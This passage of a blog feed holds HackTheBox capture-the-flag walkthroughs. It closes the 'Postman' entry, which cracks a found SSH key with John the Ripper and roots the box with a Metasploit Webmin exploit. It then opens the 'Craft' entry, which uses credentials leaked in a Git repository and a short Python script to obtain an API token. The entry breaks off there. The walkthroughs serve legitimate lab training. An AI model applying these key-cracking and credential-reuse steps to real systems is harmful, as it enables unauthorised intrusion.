&lt;p&gt;When you execute the modified script, you should be able to get a low privilege shell as redis user.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-redisscript.png&quot; alt=&quot;htb-postman-redisscript.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Lurking around, running my linux enumeration scripts, checking to see what this system is about. I found this id_rsa.bak file stored at &#x2F;opt. Obviously seems like a private key waiting to be cracked.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-idrsabak.png&quot; alt=&quot;htb-postman-idrsabak.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After Googling around on how to crack a private key, I will have to first convert the key to a format that John The Ripper tool will understand.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa.bak &amp;gt; id_rsa
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Time to begin cracking the extracted key using rockyou.txt wordlist.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-johnripper.png&quot; alt=&quot;htb-postman-johnripper.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we have the password, I&#x27;ll try and login using the unmodified key.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-connectionclosed.png&quot; alt=&quot;htb-postman-connectionclosed.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Access denied. I took a look into &#x2F;etc&#x2F;ssh&#x2F;sshd_config and shows that the user Matt is denied access.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-mattdenied.png&quot; alt=&quot;htb-postman-mattdenied.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Not too sure what to do next here, I figured maybe I should try the username and password for the Webmin control panel located on port 10000.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-webmin.png&quot; alt=&quot;htb-postman-webmin.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that I&#x27;m logged in, the control panel functionality seems limited. No where to execute commands or create cronjobs. I figured webmin has to be exploited.&lt;&#x2F;p&gt;
&lt;p&gt;I found this Webmin 1.90 exploit for metasploit: &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46984&quot;&gt;link&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-msf.png&quot; alt=&quot;htb-postman-msf.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This module will get you root permissions and easily obtain the user and root flag at the same time.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-postman&#x2F;htb-postman-rooted.png&quot; alt=&quot;htb-postman-rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Craft</title>
        <published>2020-01-04T00:00:00+00:00</published>
        <updated>2020-01-04T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-craft/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-craft/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;&#x2F;code&gt; scans show open ports on 22, 443, 6022. Lets start with port 443.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Port 443 generates a web page about craft beer.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-port443.png&quot; alt=&quot;htb-craft-port443.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;After poking around on the site and inspecting the elements of the page, there are two notable links to check out.&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;gogs.craft.htb&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;Added both of those sites and including &lt;code&gt;craft.htb&lt;&#x2F;code&gt; to my &lt;code&gt;&#x2F;etc&#x2F;hosts&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;p&gt;The API site is built using &lt;a href=&quot;https:&#x2F;&#x2F;swagger.io&quot;&gt;Swagger&lt;&#x2F;a&gt; which is a software platform to build APIs. I&#x27;ve scoped out what this API can do and see what data is available to us. Maybe we can use this to test our exploits or dig into hidden endpoints.&lt;&#x2F;p&gt;
&lt;p&gt;The Gogs site is built using &lt;a href=&quot;http:&#x2F;&#x2F;gogs.io&quot;&gt;Gogs&lt;&#x2F;a&gt; which is a git service that can be self-hosted. Looking at what can be found, there is a public repository that hosts the API site code. Before reviewing the code, I scoped out what other information we can find about this platform and who runs it. I found this open issue that was created by Dinesh with some juicy JWT authentication information.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-jwttoken.png&quot; alt=&quot;htb-craft-jwttoken.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-dinesh.png&quot; alt=&quot;htb-craft-dinesh.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I know that I&#x27;ve rooted another HTB machine using JWT tokens before so I grabbed the previous command with authentication bearer and see if I get a result.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span&gt;{&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;items&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: [{&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;10 Barrel Brewing Company&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Pub Beer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Pale Lager&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.050&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Devil&amp;#39;s Cup&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Pale Ale (APA)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.066&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;14&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Rise of the Phoenix&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American IPA&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.071&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Sinister&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Double &#x2F; Imperial IPA&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.090&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Sex and Candy&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American IPA&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.075&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Black Exodus&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Oatmeal Stout&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.077&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Lake Street Express&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Pale Ale (APA)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.045&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Foreman&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Porter&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.065&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Jade&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Pale Ale (APA)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.055&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}, {&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;18th Street Brewery&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cone Crusher&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;American Double &#x2F; Imperial IPA&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.086&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;}], &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;page&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pages&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;234&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;per_page&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;total&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2338&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So it does show a result but it&#x27;s strange. This request looks like if you sent a GET request to the API. Using the web API interface confirms my suspicions.&lt;&#x2F;p&gt;
&lt;p&gt;What is also strange is that the API also asks for username and password when trying to test for authentication. I tried using the only username and password that I found which is &lt;code&gt;dinesh&lt;&#x2F;code&gt; and &lt;code&gt;4aUh0A8PbVJxgd&lt;&#x2F;code&gt;, it worked! I used &lt;code&gt;postman&lt;&#x2F;code&gt; to play around with the values and tokens.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-postman.png&quot; alt=&quot;htb-craft-postman.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Poking around the web interface for about 5 minutes will later show the data requested can&#x27;t be generated because the token is invalid. This is when I found out that I need to create a script to avoid generating a token manually every time I need to lurk around.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Circling back and review the repository again, I&#x27;m checking to see if there is anything we can use to authenticate with the API.  In the &lt;code&gt;tests&lt;&#x2F;code&gt; folder, there is a file named &lt;code&gt;test.py&lt;&#x2F;code&gt;.  Part of the code shows that you need to insert the username and password.  Seeing how Dinesh tried to delete this information from his commit, this must be the way in.  I&#x27;ve edited the code to just see if we can get a token:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;response = requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;https:&#x2F;&#x2F;api.craft.htb&#x2F;api&#x2F;auth&#x2F;login&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;auth&lt;&#x2F;span&gt;&lt;span&gt;=(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dinesh&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;4aUh0A8PbVJxgd&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;json_response = json.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;loads&lt;&#x2F;span&gt;&lt;span&gt;(response.text)
&lt;&#x2F;span&gt;&lt;span&gt;token = json_response[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(token)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And it works! A token has been generated.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-pythonapi.png&quot; alt=&quot;htb-craft-pythonapi.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
